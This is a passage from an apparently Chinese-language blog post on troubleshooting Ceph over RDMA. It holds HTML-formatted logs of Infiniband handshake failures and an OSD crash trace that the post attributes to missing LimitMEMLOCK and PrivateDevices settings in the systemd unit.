class="hljs-number">0</span>)._fault<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29599700 <span class="hljs-number">20</span> EpollDriver.del_event del event fd=<span class="hljs-number">38</span> cur_mask=<span class="hljs-number">1</span> delmask=<span class="hljs-number">3</span> to <span class="hljs-number">27</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29599700 <span class="hljs-number">20</span>  RDMAConnectedSocketImpl ~RDMAConnectedSocketImpl destruct.<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29599700 <span class="hljs-number">20</span> EpollDriver.del_event del event fd=<span class="hljs-number">41</span> cur_mask=<span class="hljs-number">1</span> delmask=<span class="hljs-number">3</span> to <span class="hljs-number">27</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe2a59b700 <span class="hljs-number">20</span>  RDMAConnectedSocketImpl handle_connection QP: <span class="hljs-number">13050</span> tcp_fd: <span class="hljs-number">42</span> notify_fd: <span class="hljs-number">40</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe2a59b700  <span class="hljs-number">1</span> Infiniband recv_cm_meta got bad length (<span class="hljs-number">26</span>)<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe2a59b700  <span class="hljs-number">1</span>  RDMAConnectedSocketImpl handle_connection recv handshake msg failed.<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe2a59b700  <span class="hljs-number">1</span>  RDMAConnectedSocketImpl fault tcp fd <span class="hljs-number">42</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29d9a700 <span class="hljs-number">20</span>  RDMAConnectedSocketImpl handle_connection QP: <span class="hljs-number">13048</span> tcp_fd: <span class="hljs-number">43</span> notify_fd: <span class="hljs-number">39</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29d9a700  <span class="hljs-number">1</span> Infiniband recv_cm_meta got bad length (<span class="hljs-number">26</span>)<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29d9a700  <span class="hljs-number">1</span>  RDMAConnectedSocketImpl handle_connection recv handshake msg failed.<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe2a59b700 <span class="hljs-number">20</span> --  &gt;&gt; [v2:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.3</span>:<span class="hljs-number">3300</span>/<span class="hljs-number">0</span>,v1:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.3</span>:<span class="hljs-number">6789</span>/<span class="hljs-number">0</span>] conn(<span class="hljs-number">0</span>x55df3909a400 msgr2=<span class="hljs-number">0</span>x55df3900a800 unknown :-<span class="hljs-number">1</span> s=STATE_CONNECTING_RE l=<span class="hljs-number">0</span>).process<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29d9a700  <span class="hljs-number">1</span>  RDMAConnectedSocketImpl fault tcp fd <span class="hljs-number">43</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe2a59b700 <span class="hljs-number">20</span> EpollDriver.del_event del event fd=<span class="hljs-number">40</span> cur_mask=<span class="hljs-number">1</span> delmask=<span class="hljs-number">2</span> to <span class="hljs-number">21</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe2a59b700 <span class="hljs-number">10</span> --  &gt;&gt; [v2:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.3</span>:<span class="hljs-number">3300</span>/<span class="hljs-number">0</span>,v1:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.3</span>:<span class="hljs-number">6789</span>/<span class="hljs-number">0</span>] conn(<span class="hljs-number">0</span>x55df3909a400 msgr2=<span class="hljs-number">0</span>x55df3900a800 unknown :-<span class="hljs-number">1</span> s=STATE_CONNECTING_RE l=<span class="hljs-number">0</span>).process connect successfully, ready to send banner<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29d9a700 <span class="hljs-number">20</span>  RDMAConnectedSocketImpl handle_connection QP: <span class="hljs-number">13048</span> tcp_fd: <span class="hljs-number">43</span> notify_fd: <span class="hljs-number">39</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29d9a700 <span class="hljs-number">10</span> Infiniband recv_cm_meta got disconnect message<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29d9a700  <span class="hljs-number">1</span>  RDMAConnectedSocketImpl handle_connection recv handshake msg failed.<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe2a59b700 <span class="hljs-number">20</span> --<span class="hljs-number">2</span>-  &gt;&gt; [v2:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.3</span>:<span class="hljs-number">3300</span>/<span class="hljs-number">0</span>,v1:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.3</span>:<span class="hljs-number">6789</span>/<span class="hljs-number">0</span>] conn(<span class="hljs-number">0</span>x55df3909a400 <span class="hljs-number">0</span>x55df3900a800 unknown :-<span class="hljs-number">1</span> s=START_CONNECT pgs=<span class="hljs-number">0</span> cs=<span class="hljs-number">0</span> l=<span class="hljs-number">0</span> rev1=<span class="hljs-number">0</span> rx=<span class="hljs-number">0</span> tx=<span class="hljs-number">0</span>).read_event<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29d9a700  <span class="hljs-number">1</span>  RDMAConnectedSocketImpl fault tcp fd <span class="hljs-number">43</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe2a59b700 <span class="hljs-number">20</span> --<span class="hljs-number">2</span>-  &gt;&gt; [v2:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.3</span>:<span class="hljs-number">3300</span>/<span class="hljs-number">0</span>,v1:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.3</span>:<span class="hljs-number">6789</span>/<span class="hljs-number">0</span>] conn(<span class="hljs-number">0</span>x55df3909a400 <span class="hljs-number">0</span>x55df3900a800 unknown :-<span class="hljs-number">1</span> s=START_CONNECT pgs=<span class="hljs-number">0</span> cs=<span class="hljs-number">0</span> l=<span class="hljs-number">0</span> rev1=<span class="hljs-number">0</span> rx=<span class="hljs-number">0</span> tx=<span class="hljs-number">0</span>).start_client_banner_exchange<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29d9a700 <span class="hljs-number">20</span> --  &gt;&gt; [v2:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span>:<span class="hljs-number">3300</span>/<span class="hljs-number">0</span>,v1:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span>:<span class="hljs-number">6789</span>/<span class="hljs-number">0</span>] conn(<span class="hljs-number">0</span>x55df3909ac00 msgr2=<span class="hljs-number">0</span>x55df39009e00 unknown :-<span class="hljs-number">1</span> s=STATE_CONNECTING_RE l=<span class="hljs-number">0</span>).process<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29d9a700 <span class="hljs-number">20</span> EpollDriver.del_event del event fd=<span class="hljs-number">39</span> cur_mask=<span class="hljs-number">1</span> delmask=<span class="hljs-number">2</span> to <span class="hljs-number">24</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe2a59b700 <span class="hljs-number">20</span> --<span class="hljs-number">2</span>-  &gt;&gt; [v2:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.3</span>:<span class="hljs-number">3300</span>/<span class="hljs-number">0</span>,v1:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.3</span>:<span class="hljs-number">6789</span>/<span class="hljs-number">0</span>] conn(<span class="hljs-number">0</span>x55df3909a400 <span class="hljs-number">0</span>x55df3900a800 unknown :-<span class="hljs-number">1</span> s=BANNER_CONNECTING pgs=<span class="hljs-number">0</span> cs=<span class="hljs-number">0</span> l=<span class="hljs-number">0</span> rev1=<span class="hljs-number">0</span> rx=<span class="hljs-number">0</span> tx=<span class="hljs-number">0</span>)._banner_exchange<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29d9a700 <span class="hljs-number">10</span> --  &gt;&gt; [v2:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span>:<span class="hljs-number">3300</span>/<span class="hljs-number">0</span>,v1:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span>:<span class="hljs-number">6789</span>/<span class="hljs-number">0</span>] conn(<span class="hljs-number">0</span>x55df3909ac00 msgr2=<span class="hljs-number">0</span>x55df39009e00 unknown :-<span class="hljs-number">1</span> s=STATE_CONNECTING_RE l=<span class="hljs-number">0</span>).process connect successfully, ready to send banner<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29d9a700 <span class="hljs-number">20</span> --<span class="hljs-number">2</span>-  &gt;&gt; [v2:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span>:<span class="hljs-number">3300</span>/<span class="hljs-number">0</span>,v1:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span>:<span class="hljs-number">6789</span>/<span class="hljs-number">0</span>] conn(<span class="hljs-number">0</span>x55df3909ac00 <span class="hljs-number">0</span>x55df39009e00 unknown :-<span class="hljs-number">1</span> s=START_CONNECT pgs=<span class="hljs-number">0</span> cs=<span class="hljs-number">0</span> l=<span class="hljs-number">0</span> rev1=<span class="hljs-number">0</span> rx=<span class="hljs-number">0</span> tx=<span class="hljs-number">0</span>).read_event<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29d9a700 <span class="hljs-number">20</span> --<span class="hljs-number">2</span>-  &gt;&gt; [v2:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span>:<span class="hljs-number">3300</span>/<span class="hljs-number">0</span>,v1:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span>:<span class="hljs-number">6789</span>/<span class="hljs-number">0</span>] conn(<span class="hljs-number">0</span>x55df3909ac00 <span class="hljs-number">0</span>x55df39009e00 unknown :-<span class="hljs-number">1</span> s=START_CONNECT pgs=<span class="hljs-number">0</span> cs=<span class="hljs-number">0</span> l=<span class="hljs-number">0</span> rev1=<span class="hljs-number">0</span> rx=<span class="hljs-number">0</span> tx=<span class="hljs-number">0</span>).start_client_banner_exchange<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29d9a700 <span class="hljs-number">20</span> --<span class="hljs-number">2</span>-  &gt;&gt; [v2:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span>:<span class="hljs-number">3300</span>/<span class="hljs-number">0</span>,v1:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span>:<span class="hljs-number">6789</span>/<span class="hljs-number">0</span>] conn(<span class="hljs-number">0</span>x55df3909ac00 <span class="hljs-number">0</span>x55df39009e00 unknown :-<span class="hljs-number">1</span> s=BANNER_CONNECTING pgs=<span class="hljs-number">0</span> cs=<span class="hljs-number">0</span> l=<span class="hljs-number">0</span> rev1=<span class="hljs-number">0</span> rx=<span class="hljs-number">0</span> tx=<span class="hljs-number">0</span>)._banner_exchange<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe2a59b700  <span class="hljs-number">1</span> --  &gt;&gt; [v2:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.3</span>:<span class="hljs-number">3300</span>/<span class="hljs-number">0</span>,v1:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.3</span>:<span class="hljs-number">6789</span>/<span class="hljs-number">0</span>] conn(<span class="hljs-number">0</span>x55df3909a400 msgr2=<span class="hljs-number">0</span>x55df3900a800 unknown :-<span class="hljs-number">1</span> s=STATE_CONNECTION_ESTABLISHED l=<span class="hljs-number">0</span>)._try_send send error: (<span class="hljs-number">32</span>) Broken pipe<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe2a59b700  <span class="hljs-number">1</span> --<span class="hljs-number">2</span>-  &gt;&gt; [v2:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.3</span>:<span class="hljs-number">3300</span>/<span class="hljs-number">0</span>,v1:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.3</span>:<span class="hljs-number">6789</span>/<span class="hljs-number">0</span>] conn(<span class="hljs-number">0</span>x55df3909a400 <span class="hljs-number">0</span>x55df3900a800 unknown :-<span class="hljs-number">1</span> s=BANNER_CONNECTING pgs=<span class="hljs-number">0</span> cs=<span class="hljs-number">0</span> l=<span class="hljs-number">0</span> rev1=<span class="hljs-number">0</span> rx=<span class="hljs-number">0</span> tx=<span class="hljs-number">0</span>).write banner write failed r=-<span class="hljs-number">32</span> ((<span class="hljs-number">32</span>) Broken pipe)<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe2a59b700 <span class="hljs-number">10</span> --<span class="hljs-number">2</span>-  &gt;&gt; [v2:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.3</span>:<span class="hljs-number">3300</span>/<span class="hljs-number">0</span>,v1:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.3</span>:<span class="hljs-number">6789</span>/<span class="hljs-number">0</span>] conn(<span class="hljs-number">0</span>x55df3909a400 <span class="hljs-number">0</span>x55df3900a800 unknown :-<span class="hljs-number">1</span> s=BANNER_CONNECTING pgs=<span class="hljs-number">0</span> cs=<span class="hljs-number">0</span> l=<span class="hljs-number">0</span> rev1=<span class="hljs-number">0</span> rx=<span class="hljs-number">0</span> tx=<span class="hljs-number">0</span>)._fault<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe2a59b700 <span class="hljs-number">20</span> EpollDriver.del_event del event fd=<span class="hljs-number">40</span> cur_mask=<span class="hljs-number">1</span> delmask=<span class="hljs-number">3</span> to <span class="hljs-number">21</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29d9a700  <span class="hljs-number">1</span> --  &gt;&gt; [v2:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span>:<span class="hljs-number">3300</span>/<span class="hljs-number">0</span>,v1:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span>:<span class="hljs-number">6789</span>/<span class="hljs-number">0</span>] conn(<span class="hljs-number">0</span>x55df3909ac00 msgr2=<span class="hljs-number">0</span>x55df39009e00 unknown :-<span class="hljs-number">1</span> s=STATE_CONNECTION_ESTABLISHED l=<span class="hljs-number">0</span>)._try_send send error: (<span class="hljs-number">32</span>) Broken pipe<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe2a59b700 <span class="hljs-number">20</span>  RDMAConnectedSocketImpl ~RDMAConnectedSocketImpl destruct.<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe2a59b700 <span class="hljs-number">20</span> EpollDriver.del_event del event fd=<span class="hljs-number">42</span> cur_mask=<span class="hljs-number">1</span> delmask=<span class="hljs-number">3</span> to <span class="hljs-number">21</span><br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29d9a700  <span class="hljs-number">1</span> --<span class="hljs-number">2</span>-  &gt;&gt; [v2:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span>:<span class="hljs-number">3300</span>/<span class="hljs-number">0</span>,v1:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span>:<span class="hljs-number">6789</span>/<span class="hljs-number">0</span>] conn(<span class="hljs-number">0</span>x55df3909ac00 <span class="hljs-number">0</span>x55df39009e00 unknown :-<span class="hljs-number">1</span> s=BANNER_CONNECTING pgs=<span class="hljs-number">0</span> cs=<span class="hljs-number">0</span> l=<span class="hljs-number">0</span> rev1=<span class="hljs-number">0</span> rx=<span class="hljs-number">0</span> tx=<span class="hljs-number">0</span>).write banner write failed r=-<span class="hljs-number">32</span> ((<span class="hljs-number">32</span>) Broken pipe)<br><span class="hljs-number">2024</span>-<span class="hljs-number">08</span>-<span class="hljs-number">09</span>T14:<span class="hljs-number">06</span>:<span class="hljs-number">56.631</span>+<span class="hljs-number">0800</span> <span class="hljs-number">7</span>fbe29d9a700 <span class="hljs-number">10</span> --<span class="hljs-number">2</span>-  &gt;&gt; [v2:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span>:<span class="hljs-number">3300</span>/<span class="hljs-number">0</span>,v1:<span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span>:<span class="hljs-number">6789</span>/<span class="hljs-number">0</span>] conn(<span class="hljs-number">0</span>x55df3909ac00 <span class="hljs-number">0</span>x55df39009e00 unknown :-<span class="hljs-number">1</span> s=BANNER_CONNECTING pgs=<span class="hljs-number">0</span> cs=<span class="hljs-number">0</span> l=<span class="hljs-number">0</span> rev1=<span class="hljs-number">0</span> rx=<span class="hljs-number">0</span> tx=<span class="hljs-number">0</span>)._fault<br></code></pre></td></tr></table></figure><h2 id="4-2、未配置-LimitMEMLOCK-和-PrivateDevices-报错"><a href="#4-2、未配置-LimitMEMLOCK-和-PrivateDevices-报错" class="headerlink" title="4.2、未配置 LimitMEMLOCK 和 PrivateDevices 报错"></a>4.2、未配置 LimitMEMLOCK 和 PrivateDevices 报错</h2><p>该问题由于未修改 osd 启动进程的 <code>/etc/systemd/system/ceph-&lt;cluster_id&gt;@.service</code> 配置文件，导致启动 osd 启动报错，按照上面规则修改后可解决该问题。</p><p><strong>问题记录:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">Cumulative compaction: 0.00 GB write, 0.00 MB/s write, 0.00 GB <span class="hljs-built_in">read</span>, 0.00 MB/s <span class="hljs-built_in">read</span>, 0.0 seconds<br>Interval compaction: 0.00 GB write, 0.00 MB/s write, 0.00 GB <span class="hljs-built_in">read</span>, 0.00 MB/s <span class="hljs-built_in">read</span>, 0.0 seconds<br>Stalls(count): 0 level0_slowdown, 0 level0_slowdown_with_compaction, 0 level0_numfiles, 0 level0_numfiles_with_compaction, 0 stop <span class="hljs-keyword">for</span> pending_compaction_bytes, 0 slowdown <span class="hljs-keyword">for</span> pending_compaction_bytes, 0 memtable_compaction, 0 memtable_slowdown, interval 0 total count<br>Block cache BinnedLRUCache@0x55bcc84eb350#7 capacity: 1.35 GB usage: 2.47 KB table_size: 0 occupancy: 18446744073709551615 collections: 1 last_copies: 8 last_secs: 3.2e-05 secs_since: 0<br>Block cache entry stats(count,size,portion): FilterBlock(11,1.20 KB,8.49918e-05%) IndexBlock(11,1.27 KB,8.9407e-05%) Misc(1,0.00 KB,0%)<br><br>** File Read Latency Histogram By Level [P] **<br><br>2025-08-10T06:56:02.560+0000 7fd21006b740  0 &lt;cls&gt; /home/jenkins-build/build/workspace/ceph-build/ARCH/x86_64/AVAILABLE_ARCH/x86_64/AVAILABLE_DIST/centos9/DIST/centos9/MACHINE_SIZE/gigantic/release/19.2.3/rpm/el9/BUILD/ceph-19.2.3/src/cls/hello/cls_hello.cc:316: loadi<br>ng cls_hello<br>2025-08-10T06:56:02.561+0000 7fd21006b740  0 &lt;cls&gt; /home/jenkins-build/build/workspace/ceph-build/ARCH/x86_64/AVAILABLE_ARCH/x86_64/AVAILABLE_DIST/centos9/DIST/centos9/MACHINE_SIZE/gigantic/release/19.2.3/rpm/el9/BUILD/ceph-19.2.3/src/cls/cephfs/cls_cephfs.cc:201: loa<br>ding cephfs<br>2025-08-10T06:56:02.562+0000 7fd21006b740  0 _get_class not permitted to load sdk<br>2025-08-10T06:56:02.565+0000 7fd21006b740  0 _get_class not permitted to load lua<br>2025-08-10T06:56:02.565+0000 7fd21006b740  0 osd.3 0 crush map has features 288232575208783872, adjusting msgr requires <span class="hljs-keyword">for</span> clients<br>2025-08-10T06:56:02.565+0000 7fd21006b740  0 osd.3 0 crush map has features 288232575208783872 was 8705, adjusting msgr requires <span class="hljs-keyword">for</span> mons<br>2025-08-10T06:56:02.565+0000 7fd21006b740  0 osd.3 0 crush map has features 288232575208783872, adjusting msgr requires <span class="hljs-keyword">for</span> osds<br>2025-08-10T06:56:02.565+0000 7fd21006b740  0 osd.3 0 load_pgs<br>2025-08-10T06:56:02.565+0000 7fd21006b740  0 osd.3 0 load_pgs opened 0 pgs<br>2025-08-10T06:56:02.565+0000 7fd21006b740 -1 osd.3 0 log_to_monitors <span class="hljs-literal">true</span><br>2025-08-10T06:56:02.574+0000 7fd20d002640 -1 /home/jenkins-build/build/workspace/ceph-build/ARCH/x86_64/AVAILABLE_ARCH/x86_64/AVAILABLE_DIST/centos9/DIST/centos9/MACHINE_SIZE/gigantic/release/19.2.3/rpm/el9/BUILD/ceph-19.2.3/src/msg/async/rdma/Infiniband.cc: In functi<br>on <span class="hljs-string">&#x27;int Infiniband::MemoryManager::Cluster::fill(uint32_t)&#x27;</span> thread 7fd20d002640 <span class="hljs-keyword">time</span> 2025-08-10T06:56:02.571743+0000<br>/home/jenkins-build/build/workspace/ceph-build/ARCH/x86_64/AVAILABLE_ARCH/x86_64/AVAILABLE_DIST/centos9/DIST/centos9/MACHINE_SIZE/gigantic/release/19.2.3/rpm/el9/BUILD/ceph-19.2.3/src/msg/async/rdma/Infiniband.cc: 783: FAILED ceph_assert(m)<br><br> ceph version 19.2.3 (c92aebb279828e9c3c1f5d24613efca272649e62) squid (stable)<br> 1: (ceph::__ceph_assert_fail(char const*, char const*, int, char const*)+0x113) [0x55bcc517f85d]<br> 2: /usr/bin/ceph-osd(+0x401a14) [0x55bcc517fa14]<br> 3: /usr/bin/ceph-osd(+0x45669a) [0x55bcc51d469a]<br> 4: (Infiniband::init()+0x2fb) [0x55bcc5b6428b]<br> 5: (RDMAWorker::listen(entity_addr_t&amp;, unsigned int, SocketOptions const&amp;, ServerSocket*)+0x2d) [0x55bcc59d652d]<br> 6: /usr/bin/ceph-osd(+0xc24ccd) [0x55bcc59a2ccd]<br> 7: (EventCenter::process_events(unsigned int, std::chrono::duration&lt;unsigned long, std::ratio&lt;1l, 1000000000l&gt; &gt;*)+0x75d) [0x55bcc59d0d1d]<br> 8: /usr/bin/ceph-osd(+0xc53086) [0x55bcc59d1086]<br> 9: /lib64/libstdc++.so.6(+0xdbae4) [0x7fd21087fae4]<br> 10: /lib64/libc.so.6(+0x8a4da) [0x7fd21052f4da]<br> 11: <span class="hljs-built_in">clone</span>()<br><br>2025-08-10T06:56:02.588+0000 7fd20d002640 -1 *** Caught signal (Aborted) **<br> <span class="hljs-keyword">in</span> thread 7fd20d002640 thread_name:msgr-worker-0<br><br> ceph version 19.2.3 (c92aebb279828e9c3c1f5d24613efca272649e62) squid (stable)<br> 1: /lib64/libc.so.6(+0x3ebf0) [0x7fd2104e3bf0]<br> 2: /lib64/libc.so.6(+0x8c21c) [0x7fd21053121c]<br> 3: raise()<br> 4: abort()<br> 5: (ceph::__ceph_assert_fail(char const*, char const*, int, char const*)+0x169) [0x55bcc517f8b3]<br> 6: /usr/bin/ceph-osd(+0x401a14) [0x55bcc517fa14]<br> 7: /usr/bin/ceph-osd(+0x45669a) [0x55bcc51d469a]<br> 8: (Infiniband::init()+0x2fb) [0x55bcc5b6428b]<br> 9: (RDMAWorker::listen(entity_addr_t&amp;, unsigned int, SocketOptions const&amp;, ServerSocket*)+0x2d) [0x55bcc59d652d]<br> 10: /usr/bin/ceph-osd(+0xc24ccd) [0x55bcc59a2ccd]<br> 11: (EventCenter::process_events(unsigned int, std::chrono::duration&lt;unsigned long, std::ratio&lt;1l, 1000000000l&gt; &gt;*)+0x75d) [0x55bcc59d0d1d]<br> 12: /usr/bin/ceph-osd(+0xc53086) [0x55bcc59d1086]<br> 13: /lib64/libstdc++.so.6(+0xdbae4) [0x7fd21087fae4]<br> 14: /lib64/libc.so.6(+0x8a4da) [0x7fd21052f4da]<br> 15: <span class="hljs-built_in">clone</span>()<br> NOTE: a copy of the executable, or `objdump -rdS &lt;executable&gt;` is needed to interpret this.<br><br>--- begin dump of recent events ---<br> -2747&gt; 2025-08-10T06:55:56.424+0000 7fd21006b740  5 asok(0x55bcc8524000) register_command assert hook 0x55bcc845ace0<br> -2746&gt; 2025-08-10T06:55:56.424+0000 7fd21006b740  5 asok(0x55bcc8524000) register_command abort hook 0x55bcc845ace0<br> -2745&gt; 2025-08-10T06:55:56.424+0000 7fd21006b740  5 asok(0x55bcc8524000) register_command leak_some_memory hook 0x55bcc845ace0<br> -2744&gt; 2025-08-10T06:55:56.424+0000 7fd21006b740  5 asok(0x55bcc8524000) register_command perfcounters_dump hook 0x55bcc845ace0<br> -2743&gt; 2025-08-10T06:55:56.424+0000 7fd21006b740  5 asok(0x55bcc8524000) register_command 1 hook 